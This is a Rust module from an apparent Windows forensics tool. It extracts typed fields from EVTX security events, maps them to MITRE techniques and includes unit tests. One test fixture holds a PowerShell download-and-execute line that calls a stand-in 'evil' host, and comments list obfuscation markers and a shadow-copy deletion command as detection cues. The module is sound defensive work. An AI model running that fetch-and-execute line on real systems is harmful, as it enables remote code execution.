//! Typed Windows EVTX event extractors.
//!
//! Sister module to [`crate::parsers::evtx`]. The base parser walks the
//! `evtx` crate's record stream and decides which records are
//! "high-value"; this module turns those records into **typed structs**
//! per event-ID family so the rest of Strata never has to dig through a
//! `serde_json::Value` to find a username or a command line.
//!
//! Each event family carries:
//!   * its own struct (e.g. [`Win4624Logon`]) with field-level doc
//!     comments explaining forensic significance,
//!   * a parser ([`extract_4624`]) that tolerates missing or malformed
//!     EventData fields and never panics, and
//!   * a MITRE technique mapping pinned to that specific event ID — see
//!     [`mitre_for_event_id`].
//!
//! Per the user-facing schema for each emitted Strata artifact:
//!
//! ```text
//! Artifact::new("Windows Event", path_str)
//!   field: event_id        (u32, always present)
//!   field: timestamp       (Unix seconds, from Event.System.TimeCreated)
//!   field: computer_name   (Event.System.Computer)
//!   field: channel         (Event.System.Channel)
//!   field: mitre           (per `mitre_for_event_id`)
//!   field: forensic_value  (per `forensic_value_for_event_id`)
//!   field: ... typed fields specific to the event family
//! ```
//!
//! Zero `unwrap`, zero `unsafe`, zero `println` per CLAUDE.md.

use serde::Serialize;
use serde_json::Value;

// ── per-event typed structs ──────────────────────────────────────────────

/// EID 4624 — successful interactive / network / service logon.
///
/// MITRE T1078 (Valid Accounts). Most-common-by-volume event in the
/// Security log; the value comes from filtering on `logon_type` and
/// `ip_address`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Win4624Logon {
    /// Numeric Windows logon-type code as a string (Windows writes this as
    /// a digit). Common values: `"2"` interactive console, `"3"` network,
    /// `"4"` batch, `"5"` service, `"7"` unlock, `"10"` RemoteInteractive
    /// (RDP), `"11"` cached interactive. Type 10 from a non-RFC1918 IP is
    /// the canonical "exposed RDP" indicator.
    pub logon_type: String,
    /// Account that logged on. Stored without the `DOMAIN\` prefix —
    /// `domain` carries that side. Empty when Windows omits the field
    /// (rare on Win10+).
    pub username: String,
    /// Domain (or local hostname for non-domain-joined boxes). Useful for
    /// distinguishing `WORKGROUP\admin` from `CORP\admin`.
    pub domain: String,
    /// Source workstation as Windows recorded it. May be NetBIOS, FQDN, or
    /// blank depending on logon channel.
    pub workstation: String,
    /// Source IP. RFC1918-vs-public is the single most useful filter for
    /// triage. Empty for local console logons.
    pub ip_address: String,
    /// Hex logon-session ID. Joins this 4624 to the session-scoped 4634
    /// (logoff) and to subsequent 4672/4688 events for the same session.
    pub logon_id: String,
}

/// EID 4625 — failed logon.
///
/// MITRE T1110 (Brute Force). A burst of these against the same account
/// is the textbook password-spray / credential-stuffing signature.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Win4625FailedLogon {
    /// Account that failed to log on. May be a valid account or a
    /// nonexistent username — `failure_reason` distinguishes.
    pub username: String,
    /// Domain or local hostname.
    pub domain: String,
    /// Sub-status decoded by Windows (e.g. `"Unknown user name or bad
    /// password"`, `"Account currently disabled"`, `"Account locked
    /// out"`). The exact string varies by OS locale; downstream rules
    /// should match on the numeric SubStatus where possible.
    pub failure_reason: String,
    /// Source IP. Same filter as 4624 — public-IP failed logons are an
    /// order of magnitude more interesting than internal noise.
    pub ip_address: String,
    /// Logon type the failure was attempted as. See [`Win4624Logon::logon_type`].
    pub logon_type: String,
}

/// EID 4688 — process create (requires `ProcessCreationIncludeCmdLineInLog`
/// audit policy + Windows 8.1+ for `cmdline`).
///
/// MITRE T1059 (Command and Scripting Interpreter). The single most
/// important per-execution event when command-line auditing is enabled.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Win4688ProcessCreate {
    /// Full path of the new process image (e.g. `C:\Windows\System32\cmd.exe`).
    pub new_process_name: String,
    /// Full command line as launched. Empty on hosts where the audit
    /// policy bit is not set — this is the most-commonly-missing field.
    pub cmdline: String,
    /// Full path of the parent process. Parent-of-`cmd.exe`-is-`winword.exe`
    /// is the canonical Office macro execution chain.
    pub parent_process_name: String,
    /// Token elevation type as a string (`"%%1936"` = TokenElevationTypeDefault,
    /// `"%%1937"` = Full, `"%%1938"` = Limited). %%1937 from a non-admin
    /// user is a UAC bypass tell.
    pub token_elevation_type: String,
    /// User account that launched the process. SYSTEM is normal; an
    /// interactive user launching `vssadmin delete shadows` is not.
    pub subject_username: String,
}

/// EID 4698 / 4702 — scheduled task created or updated.
///
/// MITRE T1053.005 (Scheduled Task / Job: Scheduled Task).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct WinScheduledTask {
    /// Task name as registered in `\Library\TaskScheduler\` (e.g.
    /// `\Microsoft\Windows\Defrag\ScheduledDefrag`). Top-level user-named
    /// tasks (no leading vendor folder) are higher signal.
    pub task_name: String,
    /// Raw XML of the task action(s) — `<Exec><Command>` and
    /// `<Arguments>`. Stored verbatim; consumers can re-parse if they need
    /// per-action fields. Critical: this is the only place the actual
    /// payload command lives.
    pub task_action: String,
    /// User account that created or updated the task. SYSTEM tasks created
    /// by an interactive user are highly suspicious.
    pub subject_username: String,
}

/// EID 7045 — service install (`System` channel).
///
/// MITRE T1543.003 (Create or Modify System Process: Windows Service).
/// PsExec, Cobalt Strike, and many ransomware families leave 7045 traces
/// because they pivot via service install.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Win7045ServiceInstall {
    /// Service short name as registered in
    /// `HKLM\SYSTEM\CurrentControlSet\Services`.
    pub service_name: String,
    /// Path to the service executable, including any quoted arguments.
    /// Non-`%SystemRoot%` paths are the highest-signal filter.
    pub image_path: String,
    /// Service type as decimal string (`"16"` = own-process Win32, `"32"`
    /// = shared-process Win32, `"272"` = interactive Win32 — interactive
    /// services from non-Microsoft binaries are a red flag).
    pub service_type: String,
    /// Start type as decimal string (`"0"` = boot, `"1"` = system, `"2"`
    /// = automatic, `"3"` = manual, `"4"` = disabled). Auto-start
    /// services from `\Temp\` are essentially never legitimate.
    pub start_type: String,
    /// Account the service runs as. `LocalSystem` is normal; arbitrary
    /// user accounts in 7045 events demand investigation.
    pub account_name: String,
}

/// EID 4103 / 4104 — PowerShell module / script-block logging.
///
/// MITRE T1059.001 (Command and Scripting Interpreter: PowerShell). 4104
/// is the highest-signal Windows event for fileless / living-off-the-land
/// attacks.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct WinPowerShellScript {
    /// Verbatim PowerShell script text. May be a one-line interactive
    /// command or a multi-kilobyte block. Look for `FromBase64String`,
    /// `IEX`, `DownloadString`, `[char]` — the canonical obfuscation
    /// markers.
    pub script_block_text: String,
    /// GUID of the script block. Multi-block scripts get the same GUID
    /// across each chunk.
    pub script_block_id: String,
    /// File path the script came from, if the block was loaded from disk.
    /// Empty for interactive / pipeline-injected blocks.
    pub path: String,
}

/// EID 1102 — security audit log cleared.
///
/// MITRE T1070.001 (Indicator Removal: Clear Windows Event Logs). There
/// is no legitimate operational reason to clear this log on a production
/// host, so every 1102 should be treated as `forensic_value: High`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Win1102LogCleared {
    /// Account that cleared the log. SYSTEM is suspicious in its own
    /// right — an attacker with SYSTEM is precisely who would clear the
    /// log to cover tracks.
    pub subject_username: String,
    /// Domain of the clearing account.
    pub subject_domain: String,
}

/// Tagged union of every event family we extract typed fields for. Carry
/// in `serde_json::Value` for downstream JSON serialization; the typed
/// surface lets callers avoid `Value` lookups entirely.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "event_kind", rename_all = "snake_case")]
pub enum StructuredEvent {
    Logon4624(Win4624Logon),
    FailedLogon4625(Win4625FailedLogon),
    ProcessCreate4688(Win4688ProcessCreate),
    ScheduledTask(WinScheduledTask),
    ServiceInstall7045(Win7045ServiceInstall),
    PowerShellScript(WinPowerShellScript),
    LogCleared1102(Win1102LogCleared),
}

/// MITRE technique mapping per event ID, as specified by the Strata
/// detection schema. Returns `None` for event IDs this module does not
/// classify — callers should fall back to the parser-level default.
pub fn mitre_for_event_id(event_id: u32) -> Option<&'static str> {
    Some(match event_id {
        4624 => "T1078",
        4625 => "T1110",
        4688 => "T1059",
        4698 | 4702 => "T1053.005",
        7045 => "T1543.003",
        4103 | 4104 => "T1059.001",
        1102 => "T1070.001",
        _ => return None,
    })
}

/// `forensic_value` field level for the artifact. 1102 is always High
/// because log clearing has no legitimate operational reason; everything
/// else inherits "High" too because every event in the structured set is
/// already on the high-value whitelist.
pub fn forensic_value_for_event_id(event_id: u32) -> &'static str {
    match event_id {
        1102 => "High",
        4624 | 4625 | 4688 | 4698 | 4702 | 7045 | 4103 | 4104 => "High",
        _ => "Medium",
    }
}

// ── per-event extractors ─────────────────────────────────────────────────

/// Parse a 4624 logon record. Missing fields become empty strings; the
/// function never panics on malformed input.
pub fn extract_4624(root: &Value) -> Win4624Logon {
    Win4624Logon {
        logon_type: event_data_str(root, "LogonType").unwrap_or_default(),
        username: event_data_str(root, "TargetUserName").unwrap_or_default(),
        domain: event_data_str(root, "TargetDomainName").unwrap_or_default(),
        workstation: event_data_str(root, "WorkstationName").unwrap_or_default(),
        ip_address: event_data_str(root, "IpAddress").unwrap_or_default(),
        logon_id: event_data_str(root, "TargetLogonId").unwrap_or_default(),
    }
}

/// Parse a 4625 failed-logon record.
pub fn extract_4625(root: &Value) -> Win4625FailedLogon {
    Win4625FailedLogon {
        username: event_data_str(root, "TargetUserName").unwrap_or_default(),
        domain: event_data_str(root, "TargetDomainName").unwrap_or_default(),
        failure_reason: event_data_str(root, "FailureReason")
            .or_else(|| event_data_str(root, "Status"))
            .or_else(|| event_data_str(root, "SubStatus"))
            .unwrap_or_default(),
        ip_address: event_data_str(root, "IpAddress").unwrap_or_default(),
        logon_type: event_data_str(root, "LogonType").unwrap_or_default(),
    }
}

/// Parse a 4688 process-create record.
pub fn extract_4688(root: &Value) -> Win4688ProcessCreate {
    Win4688ProcessCreate {
        new_process_name: event_data_str(root, "NewProcessName").unwrap_or_default(),
        cmdline: event_data_str(root, "CommandLine").unwrap_or_default(),
        parent_process_name: event_data_str(root, "ParentProcessName").unwrap_or_default(),
        token_elevation_type: event_data_str(root, "TokenElevationType").unwrap_or_default(),
        subject_username: event_data_str(root, "SubjectUserName").unwrap_or_default(),
    }
}

/// Parse a 4698 / 4702 scheduled-task record.
pub fn extract_scheduled_task(root: &Value) -> WinScheduledTask {
    WinScheduledTask {
        task_name: event_data_str(root, "TaskName").unwrap_or_default(),
        task_action: event_data_str(root, "TaskContent")
            .or_else(|| event_data_str(root, "ActionName"))
            .or_else(|| event_data_str(root, "Action"))
            .unwrap_or_default(),
        subject_username: event_data_str(root, "SubjectUserName").unwrap_or_default(),
    }
}

/// Parse a 7045 service-install record.
pub fn extract_7045(root: &Value) -> Win7045ServiceInstall {
    Win7045ServiceInstall {
        service_name: event_data_str(root, "ServiceName").unwrap_or_default(),
        image_path: event_data_str(root, "ImagePath").unwrap_or_default(),
        service_type: event_data_str(root, "ServiceType").unwrap_or_default(),
        start_type: event_data_str(root, "StartType").unwrap_or_default(),
        account_name: event_data_str(root, "AccountName")
            .or_else(|| event_data_str(root, "ServiceAccount"))
            .unwrap_or_default(),
    }
}

/// Parse a 4103 / 4104 PowerShell script-block record.
pub fn extract_powershell(root: &Value) -> WinPowerShellScript {
    WinPowerShellScript {
        script_block_text: event_data_str(root, "ScriptBlockText").unwrap_or_default(),
        script_block_id: event_data_str(root, "ScriptBlockId").unwrap_or_default(),
        path: event_data_str(root, "Path").unwrap_or_default(),
    }
}

/// Parse a 1102 log-cleared record.
pub fn extract_1102(root: &Value) -> Win1102LogCleared {
    Win1102LogCleared {
        subject_username: event_data_str(root, "SubjectUserName")
            .or_else(|| user_data_str(root, "SubjectUserName"))
            .unwrap_or_default(),
        subject_domain: event_data_str(root, "SubjectDomainName")
            .or_else(|| user_data_str(root, "SubjectDomainName"))
            .unwrap_or_default(),
    }
}

/// Top-level dispatch — pick the right extractor for an event ID. Returns
/// `None` for event IDs this module does not classify.
pub fn extract_event(event_id: u32, root: &Value) -> Option<StructuredEvent> {
    Some(match event_id {
        4624 => StructuredEvent::Logon4624(extract_4624(root)),
        4625 => StructuredEvent::FailedLogon4625(extract_4625(root)),
        4688 => StructuredEvent::ProcessCreate4688(extract_4688(root)),
        4698 | 4702 => StructuredEvent::ScheduledTask(extract_scheduled_task(root)),
        7045 => StructuredEvent::ServiceInstall7045(extract_7045(root)),
        4103 | 4104 => StructuredEvent::PowerShellScript(extract_powershell(root)),
        1102 => StructuredEvent::LogCleared1102(extract_1102(root)),
        _ => return None,
    })
}

// ── value-walking helpers ───────────────────────────────────────────────

/// Read an `Event.EventData.<key>` string. Tolerates the `evtx`-crate
/// wrapping where each EventData child is either a string, a number, or
/// an object containing `#text` / `Value`.
pub(crate) fn event_data_str(root: &Value, key: &str) -> Option<String> {
    section_str(root, "EventData", key)
}

/// Read an `Event.UserData.<key>` string — used by 1102, which Windows
/// emits via UserData rather than EventData.
pub(crate) fn user_data_str(root: &Value, key: &str) -> Option<String> {
    section_str(root, "UserData", key)
}

fn section_str(root: &Value, section: &str, key: &str) -> Option<String> {
    let event = root.get("Event")?;
    let data = event.get(section)?;
    // EventData/UserData may be one level deep ({key: val}) or nested via
    // a wrapper element ({wrapper: {key: val}}). Try both.
    if let Some(v) = data.get(key) {
        return value_as_string(v);
    }
    if let Value::Object(map) = data {
        for (_, child) in map {
            if let Some(v) = child.get(key) {
                if let Some(s) = value_as_string(v) {
                    return Some(s);
                }
            }
        }
    }
    None
}

fn value_as_string(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        Value::Object(o) => o
            .get("#text")
            .or_else(|| o.get("Value"))
            .and_then(value_as_string),
        Value::Array(_) | Value::Null => None,
    }
}

// ── tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// Build a record shaped like what `evtx::EvtxParser::records_json_value`
    /// emits: `{ "Event": { "EventData": { ... } } }`.
    fn event_with_data(data: serde_json::Value) -> serde_json::Value {
        json!({ "Event": { "EventData": data } })
    }

    #[test]
    fn extract_4624_pulls_typed_logon_fields() {
        let rec = event_with_data(json!({
            "TargetUserName": "alice",
            "TargetDomainName": "CORP",
            "WorkstationName": "WS-01",
            "IpAddress": "10.0.0.55",
            "LogonType": "10",
            "TargetLogonId": "0x12345"
        }));
        let parsed = extract_4624(&rec);
        assert_eq!(parsed.username, "alice");
        assert_eq!(parsed.domain, "CORP");
        assert_eq!(parsed.workstation, "WS-01");
        assert_eq!(parsed.ip_address, "10.0.0.55");
        assert_eq!(parsed.logon_type, "10");
        assert_eq!(parsed.logon_id, "0x12345");
    }

    #[test]
    fn extract_4625_uses_failure_reason_or_substatus_fallback() {
        let primary = event_with_data(json!({
            "TargetUserName": "bob",
            "FailureReason": "Bad password",
            "IpAddress": "192.168.1.10",
            "LogonType": "3"
        }));
        let p = extract_4625(&primary);
        assert_eq!(p.failure_reason, "Bad password");

        let fallback = event_with_data(json!({
            "TargetUserName": "bob",
            "SubStatus": "0xC000006A",
            "IpAddress": "1.2.3.4",
            "LogonType": "3"
        }));
        let p = extract_4625(&fallback);
        assert_eq!(p.failure_reason, "0xC000006A");
    }

    #[test]
    fn extract_4688_handles_missing_cmdline_gracefully() {
        let rec = event_with_data(json!({
            "NewProcessName": r"C:\Windows\System32\cmd.exe",
            "ParentProcessName": r"C:\Program Files\Microsoft Office\winword.exe",
            "TokenElevationType": "%%1937",
            "SubjectUserName": "alice"
            // CommandLine intentionally absent — common when audit policy
            // bit is off.
        }));
        let p = extract_4688(&rec);
        assert_eq!(p.new_process_name, r"C:\Windows\System32\cmd.exe");
        assert_eq!(p.cmdline, "");
        assert_eq!(p.parent_process_name, r"C:\Program Files\Microsoft Office\winword.exe");
        assert_eq!(p.token_elevation_type, "%%1937");
        assert_eq!(p.subject_username, "alice");
    }

    #[test]
    fn extract_scheduled_task_parses_4698_payload() {
        let rec = event_with_data(json!({
            "TaskName": r"\Updater\PayloadDelivery",
            "TaskContent": "<Exec><Command>powershell.exe</Command></Exec>",
            "SubjectUserName": "SYSTEM"
        }));
        let p = extract_scheduled_task(&rec);
        assert_eq!(p.task_name, r"\Updater\PayloadDelivery");
        assert!(p.task_action.contains("powershell.exe"));
        assert_eq!(p.subject_username, "SYSTEM");
    }

    #[test]
    fn extract_7045_parses_service_install() {
        let rec = event_with_data(json!({
            "ServiceName": "PSEXESVC",
            "ImagePath": r"C:\Windows\PSEXESVC.exe",
            "ServiceType": "16",
            "StartType": "3",
            "AccountName": "LocalSystem"
        }));
        let p = extract_7045(&rec);
        assert_eq!(p.service_name, "PSEXESVC");
        assert_eq!(p.image_path, r"C:\Windows\PSEXESVC.exe");
        assert_eq!(p.service_type, "16");
        assert_eq!(p.start_type, "3");
        assert_eq!(p.account_name, "LocalSystem");
    }

    #[test]
    fn extract_powershell_captures_script_block() {
        let rec = event_with_data(json!({
            "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')",
            "ScriptBlockId": "01234567-89ab-cdef-0123-456789abcdef",
            "Path": ""
        }));
        let p = extract_powershell(&rec);
        assert!(p.script_block_text.contains("DownloadString"));
        assert_eq!(p.script_block_id, "01234567-89ab-cdef-0123-456789abcdef");
        assert_eq!(p.path, "");
    }

    #[test]
    fn extract_1102_reads_user_data_section() {
        // 1102 uses UserData not EventData on real Windows.
        let rec = json!({
            "Event": {
                "UserData": {
                    "LogFileCleared": {
                        "SubjectUserName": "alice",
                        "SubjectDomainName": "CORP"
                    }
                }
            }
        });
        let p = extract_1102(&rec);
        assert_eq!(p.subject_username, "alice");
        assert_eq!(p.subject_domain, "CORP");
    }

    #[test]
    fn mitre_mapping_matches_specified_table() {
        assert_eq!(mitre_for_event_id(4624), Some("T1078"));
        assert_eq!(mitre_for_event_id(4625), Some("T1110"));
        assert_eq!(mitre_for_event_id(4688), Some("T1059"));
        assert_eq!(mitre_for_event_id(4698), Some("T1053.005"));
        assert_eq!(mitre_for_event_id(4702), Some("T1053.005"));
        assert_eq!(mitre_for_event_id(7045), Some("T1543.003"));
        assert_eq!(mitre_for_event_id(4103), Some("T1059.001"));
        assert_eq!(mitre_for_event_id(4104), Some("T1059.001"));
        assert_eq!(mitre_for_event_id(1102), Some("T1070.001"));
        assert_eq!(mitre_for_event_id(9999), None);
    }

    #[test]
    fn forensic_value_for_1102_is_high() {
        assert_eq!(forensic_value_for_event_id(1102), "High");
        assert_eq!(forensic_value_for_event_id(4624), "High");
        assert_eq!(forensic_value_for_event_id(9999), "Medium");
    }

    #[test]
    fn extract_event_dispatch_returns_correct_variant() {
        let rec = event_with_data(json!({"TargetUserName": "x"}));
        match extract_event(4624, &rec) {
            Some(StructuredEvent::Logon4624(_)) => {}
            other => panic!("expected Logon4624, got {:?}", other),
        }
        assert!(extract_event(9999, &rec).is_none());
    }

    #[test]
    fn missing_event_data_returns_empty_strings_not_panic() {
        // Malformed root — no "Event" key at all.
        let rec = json!({"GarbageRoot": true});
        let p = extract_4624(&rec);
        assert_eq!(p.username, "");
        assert_eq!(p.ip_address, "");
        // No panic = test passes.
    }
}
